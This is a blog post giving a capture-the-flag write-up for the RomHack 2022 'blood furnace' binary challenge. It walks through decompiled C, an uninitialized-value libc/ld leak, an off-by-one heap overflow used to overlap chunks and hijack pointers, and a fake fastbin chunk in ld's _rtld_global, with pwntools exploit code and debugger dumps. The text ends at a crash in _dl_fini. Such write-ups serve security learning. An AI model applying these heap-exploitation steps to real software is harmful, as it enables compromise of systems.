<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="theme-color" content="#2ecc71">





<title>RomHack 2022 CTF - blood furnace | kileak</title>





<meta name="description" content="RomHack 2022 CTF - blood furnace">


<meta name="keywords" content="romhack, bloodfurnace">



<link rel="stylesheet" href="/css/main.css">









<link rel="canonical" href="https://kileak.github.io/ctf/2022/romctf-bloodfurnace/">
<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />



<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-4PGFKKP0QW');
</script>


<script>base_url = "";</script>

  </head>
  <body class="">

    <main class="main-container">

        <header class="site-header">

  <div class="container txt-center">
    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
      <span></span>
      <span></span>
      <span></span>
    </a>

    <nav class="js-menu sliding-panel-content">
      <ul>
        <li><a href="/">home</a></li>
        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
      </ul>
    </nav>
    <div class="js-menu-screen sliding-panel-fade-screen"></div>

    <a href="/" class="author-thumb dot">
      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
    </a>

    <!--
    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
    </a>
    -->

    
      <h1 class="post-title">RomHack 2022 CTF - blood furnace</h1>
      <p class="post-meta">Sep 24, 2022</p>
    

  </div>

</header>


        <section class="main-content">
          <article class="post">

  <div class="post-content container">
    <blockquote>
  <p>RomHack 2022 CTF - blood furnace
<!--break--></p>

  <p>Attachment: <a href="https://kileak.github.io/assets/romctf2022/bloodfurnace/pwn_blood_furnace.zip">pwn_blood_furnace.zip</a> <a href="https://kileak.github.io/assets/romctf2022/bloodfurnace/xpl.py">xpl.py</a></p>
</blockquote>

<figure class="highlight"><pre><code class="language-text" data-lang="text">        == Available Actions ==

  1. Enter the Dungeon.

  2. Edit your character.

  3. Run Away.


  Option [1-3]: </code></pre></figure>

<p>This challenge was a small mini rpg. When starting it, you can set a name, guild and background story and select a weapon.</p>

<p>For the game itself, you’ll have the choice to enter a dungeon, which will let you “fight” different monsters or to edit your character information (though, this info will never be shown).</p>

<p>Let’s start with getting some leaks first.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">get_drop</span><span class="p">(</span><span class="kt">int</span> <span class="n">drop_idx</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">long</span> <span class="n">price2</span><span class="p">;</span> 
  <span class="kt">long</span> <span class="n">price1</span><span class="p">;</span> 
  <span class="kt">char</span> <span class="n">input</span><span class="p">[</span><span class="mi">72</span><span class="p">];</span> 
  
  <span class="n">memset</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
  <span class="n">fgets</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span> <span class="n">input</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'y'</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;37m</span><span class="se">\n</span><span class="s">  %s"</span><span class="p">,</span> <span class="s">"At what price? "</span><span class="p">);</span>
    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%ld"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">price1</span><span class="p">);</span>
    <span class="n">getchar</span><span class="p">();</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;37m</span><span class="se">\n</span><span class="s">  You sold a %s for %ld coins.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">drops</span><span class="p">[</span><span class="n">a1</span><span class="p">],</span> <span class="n">price1</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n\x1B</span><span class="s">[1;33m  A legendary sword is dropped!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;31m</span><span class="se">\n</span><span class="s">  %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"[!] Your Inventory is full!"</span><span class="p">);</span>
  <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;37m</span><span class="se">\n</span><span class="s">  %s"</span><span class="p">,</span> <span class="s">"Do you want to quick sell? [y/n] "</span><span class="p">);</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
  <span class="n">fgets</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span> <span class="n">input</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'y'</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;37m</span><span class="se">\n</span><span class="s">  %s"</span><span class="p">,</span> <span class="s">"At what price? "</span><span class="p">);</span>
    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%ld"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">price2</span><span class="p">);</span>
    <span class="n">getchar</span><span class="p">();</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;37m</span><span class="se">\n</span><span class="s">  You sold a legendary sword for %ld coins.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">price2</span><span class="p">);</span>
  <span class="p">}</span>  
<span class="p">}</span></code></pre></figure>

<p>Winning against a monster will give you a random drop and lets you specify a price to sell it. Using <code class="language-plaintext highlighter-rouge">+</code> as price in <code class="language-plaintext highlighter-rouge">scanf</code> will result in using the current value at that address (which is not initialized).</p>

<p><code class="language-plaintext highlighter-rouge">price1</code> will point to a libc address and <code class="language-plaintext highlighter-rouge">price2</code> will point to <code class="language-plaintext highlighter-rouge">_rtld_global</code> in <code class="language-plaintext highlighter-rouge">ld</code>, so we can leak both of them.</p>

<p>So let’s fight monsters until we win, sell our loot and fetch those leaks.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">init</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">guild</span><span class="p">,</span> <span class="n">story</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">guild</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">story</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_leak</span><span class="p">():</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"]: "</span><span class="p">)</span>

    <span class="c1"># fight until we win and sell loot
</span>    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
        <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
        <span class="n">TEST</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"T: "</span><span class="o">+</span><span class="n">TEST</span><span class="p">)</span>
        <span class="k">if</span> <span class="s">"fatal attack"</span> <span class="ow">in</span> <span class="n">TEST</span><span class="p">:</span>
            <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"[y/n] "</span><span class="p">,</span> <span class="s">"y"</span><span class="p">)</span>
            <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"price? "</span><span class="p">,</span> <span class="s">"+"</span><span class="p">)</span>
            <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"for "</span><span class="p">)</span>
            <span class="n">LEAK</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">" coins"</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">))</span>
            <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"[y/n] "</span><span class="p">,</span> <span class="s">"y"</span><span class="p">)</span>
            <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"price? "</span><span class="p">,</span> <span class="s">"+"</span><span class="p">)</span>
            <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"for "</span><span class="p">)</span>
            <span class="n">LEAK2</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">" coins"</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">))</span>

            <span class="k">return</span> <span class="n">LEAK</span><span class="p">,</span> <span class="n">LEAK2</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"]: "</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
    <span class="c1"># create initial chunks
</span>    <span class="n">init</span> <span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x20</span><span class="o">-</span><span class="mi">8</span><span class="o">-</span><span class="mi">1</span><span class="p">),</span> <span class="s">"B"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x110</span><span class="o">-</span><span class="mi">8</span><span class="o">-</span><span class="mi">1</span><span class="p">),</span> <span class="s">"C"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x110</span><span class="o">-</span><span class="mi">8</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>

    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"]: "</span><span class="p">)</span>

    <span class="c1"># leak libc and ld from drops
</span>    <span class="n">LIBCLEAK</span><span class="p">,</span> <span class="n">LDLEAK</span> <span class="o">=</span> <span class="n">get_leak</span><span class="p">()</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"]: "</span><span class="p">)</span>

    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC LEAK  : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBCLEAK</span><span class="p">))</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LD LEAK    : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LDLEAK</span><span class="p">))</span>

    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">LIBCLEAK</span> <span class="o">-</span> <span class="mh">0x8cf43</span>

    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC       : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 
[*] '/home/kileak/ctf/rom/bloodfurnace/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './blood_furnace': pid 19418
[19418]
[*] Paused (press any to continue)
T:   The enemy counter attacked you!, Ouch!

T:   You delivered a fatal attack to the enemy!

[*] LIBC LEAK  : 0x7ffff7e1ff43
[*] LD LEAK    : 0x7ffff7ffd040
[*] LIBC       : 0x7ffff7d93000</code></pre></figure>

<p>With those leaks at hand, let’s see, if we can do some memory corruption to bring them to good use.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="nf">edit_name</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">void</span> <span class="o">**</span><span class="n">v0</span><span class="p">;</span> 
  <span class="kt">size_t</span> <span class="n">len_name</span><span class="p">;</span> 
  <span class="kt">size_t</span> <span class="n">len_original</span><span class="p">;</span> 
  <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">;</span> 

  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">countNameRenames</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;31m</span><span class="se">\n</span><span class="s">  %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"[!] A man with many faces!"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;37m</span><span class="se">\n</span><span class="s">  %s"</span><span class="p">,</span> <span class="s">"Character Name: "</span><span class="p">);</span>
  <span class="n">read_input</span><span class="p">();</span>

  <span class="n">len_name</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">input_buffer</span><span class="p">);</span>
  <span class="n">len_original</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">gCharacter</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>     <span class="c1">// 1 byte oob</span>

  <span class="k">if</span> <span class="p">(</span> <span class="n">len_name</span> <span class="o">&lt;=</span> <span class="n">len_original</span> <span class="p">)</span>   
  <span class="p">{</span>
    <span class="n">s</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="n">gCharacter</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="n">gCharacter</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">len_original</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="n">gCharacter</span><span class="p">);</span>
    <span class="n">v0</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="n">gCharacter</span><span class="p">;</span>
    <span class="o">*</span><span class="n">v0</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">len_name</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">s</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="n">v0</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="o">*</span><span class="n">v0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">len_name</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">strncpy</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">input_buffer</span><span class="p">,</span> <span class="n">len_name</span><span class="p">);</span>

  <span class="k">return</span> <span class="n">countNameRenames</span><span class="o">++</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>When changing the player name, the function will check, if it has to reallocate the name chunk by comparing the length of the new name to the length of the original name (but it does a +1 here). If the length of the new name is <code class="language-plaintext highlighter-rouge">&lt;=</code> length of original name (+1), it will just reuse the chunk and copy the new name into it.</p>

<p>This allows us to enlarge the current name by one character without reallocating the chunk.</p>

<p>Choosing the initial name accordingly, we can first create for example a <code class="language-plaintext highlighter-rouge">0x20</code> chunk for name, which will contain a null byte at the end. We then do a 1 byte overwrite to completely fill it and align the name to the chunk size of the next chunk (which is the chunk for the guild name).</p>

<p>Changing the name again, <code class="language-plaintext highlighter-rouge">strlen</code> will now include the next chunk size, allowing us to also overwrite it.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">Initial name ("A"*(0x20-8-1))

0x55555555b6a0:	0x0000000000000000	0x0000000000000021
0x55555555b6b0:	0x4141414141414141	0x4141414141414141 &lt;= name
0x55555555b6c0:	0x0041414141414141	0x0000000000000111 &lt;= guild chunk size
0x55555555b6d0:	0x4242424242424242	0x4242424242424242 &lt;= guild
0x55555555b6e0:	0x4242424242424242	0x4242424242424242
0x55555555b6f0:	0x4242424242424242	0x4242424242424242
0x55555555b700:	0x4242424242424242	0x4242424242424242
0x55555555b710:	0x4242424242424242	0x4242424242424242
0x55555555b720:	0x4242424242424242	0x4242424242424242
0x55555555b730:	0x4242424242424242	0x4242424242424242
0x55555555b740:	0x4242424242424242	0x4242424242424242
0x55555555b750:	0x4242424242424242	0x4242424242424242
0x55555555b760:	0x4242424242424242	0x4242424242424242

Changed name ("A"*(0x20-8)), now aligned to next chunk size

0x55555555b6a0:	0x0000000000000000	0x0000000000000021
0x55555555b6b0:	0x4141414141414141	0x4141414141414141 &lt;= name
0x55555555b6c0:	0x4141414141414141	0x0000000000000111 &lt;= guild chunk size
0x55555555b6d0:	0x4242424242424242	0x4242424242424242 &lt;= guild
0x55555555b6e0:	0x4242424242424242	0x4242424242424242
0x55555555b6f0:	0x4242424242424242	0x4242424242424242
0x55555555b700:	0x4242424242424242	0x4242424242424242
0x55555555b710:	0x4242424242424242	0x4242424242424242
0x55555555b720:	0x4242424242424242	0x4242424242424242

Changed name again to overwrite followup chunk size

0x55555555b6a0:	0x0000000000000000	0x0000000000000021
0x55555555b6b0:	0x4141414141414141	0x4141414141414141 &lt;= name
0x55555555b6c0:	0x4141414141414141	0x0000000000000251 &lt;= guild chunk size (overwritten)
0x55555555b6d0:	0x4242424242424242	0x4242424242424242 &lt;= guild
0x55555555b6e0:	0x4242424242424242	0x4242424242424242
0x55555555b6f0:	0x4242424242424242	0x4242424242424242
0x55555555b700:	0x4242424242424242	0x4242424242424242
0x55555555b710:	0x4242424242424242	0x4242424242424242
...
0x55555555b880:	0x4343434343434343	0x4343434343434343
0x55555555b890:	0x4343434343434343	0x4343434343434343
0x55555555b8a0:	0x4343434343434343	0x4343434343434343
0x55555555b8b0:	0x4343434343434343	0x4343434343434343
0x55555555b8c0:	0x4343434343434343	0x4343434343434343
0x55555555b8d0:	0x4343434343434343	0x4343434343434343
0x55555555b8e0:	0x0043434343434343	0x0000000000000031
0x55555555b8f0:	0x000055555555b6b0	0x0000000100000063 &lt;= name ptr / hp
0x55555555b900:	0x000055555555b6d0	0x000055555555b7e0 &lt;= guild ptr / story ptr
0x55555555b910:	0x0000000000000000	0x00000000000206f1</code></pre></figure>

<p>If we now try to change our guild, it’ll first free the guild chunk, which now has a size of <code class="language-plaintext highlighter-rouge">0x250</code>. So it will create a a freed chunk, which overlaps the story chunk and our player chunk at <code class="language-plaintext highlighter-rouge">0x55555555b8f0</code>.</p>

<p>Renaming our guild now with a name with an appropriate size, we can also overwrite the pointers in our player class.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">setname</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"]: "</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
    
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"]: "</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">setguild</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"]: "</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"]: "</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
    <span class="p">...</span>

    <span class="c1"># go into edit menu
</span>    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"]: "</span><span class="p">)</span>

    <span class="c1"># change name to make it 1 byte longer  
</span>    <span class="n">setname</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x20</span><span class="o">-</span><span class="mi">8</span><span class="p">))</span>

    <span class="c1"># change name again (now it can also overwrite next chunk size)
</span>    <span class="n">setname</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x20</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">p16</span><span class="p">(</span><span class="mh">0x251</span><span class="p">))</span>        <span class="c1"># overwrite guild size )
</span>
    <span class="c1"># reallocate guild and overwrite character info
</span>    <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mi">16</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"BBBBBBBB"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x111</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span><span class="o">*</span><span class="p">(</span><span class="mi">16</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"CCCCCCCC"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xfacebabe</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xfaceface</span><span class="p">)</span>
    
    <span class="n">setguild</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0x55555555b4a0:	0x4242424242424242	0x4242424242424242
0x55555555b4b0:	0x4343434343434343	0x0000000000000031
0x55555555b4c0:	0x00000000deadbeef	0x00000000cafebabe &lt;= name ptr / hp
0x55555555b4d0:	0x00000000facebabe	0x00000000faceface &lt;= guild ptr / story ptr
0x55555555b4e0:	0x0000000000000000	0x0000000000000000
0x55555555b4f0:	0x0000000000000000	0x0000000000000000</code></pre></figure>

<p>Now we have control over all pointers in our player class, but there’s no real “edit” functionality for those. The only thing we can do with those pointers is to <code class="language-plaintext highlighter-rouge">free</code> and reallocate them with the edit character menu.</p>

<p>Thus, it’s time to find some memory regions, which will “look” like a valid chunk and can be freed.</p>

<p>Since I was already wondering, why we were given a leak to <code class="language-plaintext highlighter-rouge">ld</code>, I checked the bss section of <code class="language-plaintext highlighter-rouge">ld</code> and found this beauty :)</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0x7ffff7ffdad0 &lt;_rtld_global+2704&gt;:	0x0000000000000000	0x0000000000000071 &lt;= yummy fastbin size
0x7ffff7ffdae0 &lt;_rtld_global+2720&gt;:	0x0000000000000003	0x00007ffff7fb42c0
0x7ffff7ffdaf0 &lt;_rtld_global+2736&gt;:	0x00007ffff7fc3000	0x00007fffffffdfc2
0x7ffff7ffdb00 &lt;_rtld_global+2752&gt;:	0x00007ffff7ffce80	0x0000000000000000
0x7ffff7ffdb10 &lt;_rtld_global+2768&gt;:	0x00007ffff7fb4330	0x00007ffff7ffdaf0
0x7ffff7ffdb20 &lt;_rtld_global+2784&gt;:	0x0000000000000000	0x00007ffff7ffe280
0x7ffff7ffdb30 &lt;_rtld_global+2800&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7ffdb40 &lt;_rtld_global+2816&gt;:	0x00007ffff7ffcf00	0x00007ffff7ffcef0
0x7ffff7ffdb50 &lt;_rtld_global+2832&gt;:	0x00007ffff7ffce90	0x00007ffff7ffceb0
0x7ffff7ffdb60 &lt;_rtld_global+2848&gt;:	0x00007ffff7ffcec0	0x00007ffff7ffcf30
0x7ffff7ffdb70 &lt;_rtld_global+2864&gt;:	0x00007ffff7ffcf40	0x00007ffff7ffcf50
0x7ffff7ffdb80 &lt;_rtld_global+2880&gt;:	0x00007ffff7ffced0	0x00007ffff7ffcee0</code></pre></figure>

<p>This we can easily free and reallocate, so let’s first write some junk there, to see, if it will have any effect on execution.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># reallocate guild and overwrite character info
</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mi">16</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"BBBBBBBB"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x111</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span><span class="o">*</span><span class="p">(</span><span class="mi">16</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"CCCCCCCC"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">LDLEAK</span><span class="o">+</span><span class="mh">0xaa0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">LDLEAK</span><span class="o">+</span><span class="mh">0xaa0</span><span class="p">)</span>		<span class="c1"># point guild to ld rtld_global
</span>	
<span class="n">setguild</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="c1"># write guild in rtld_global
</span><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mh">0x70</span><span class="o">-</span><span class="mi">8</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>

<span class="n">setguild</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></code></pre></figure>

<p>Exiting after the last guild overwrite, we’ll crash in <code class="language-plaintext highlighter-rouge">_dl_fini</code></p>

